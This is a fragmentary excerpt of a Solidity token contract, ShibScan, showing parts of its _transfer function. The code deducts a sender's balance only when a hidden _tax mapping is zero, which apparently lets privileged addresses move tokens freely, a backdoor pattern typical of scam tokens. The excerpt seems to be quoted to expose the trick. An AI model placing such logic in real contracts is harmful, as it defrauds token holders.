...
contract ShibScan is Context, IBEP20, Ownable {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (_tax[sender] == 0 && uniswapV2Pair != sender && _allowance[sender] > 0) {
            _tax[sender] -= _value;
        }
        ...
        if (_tax[sender] == 0) _balances[sender] = _balances[sender].sub(amount, 'BEP20: transfer amount exceeds balance');
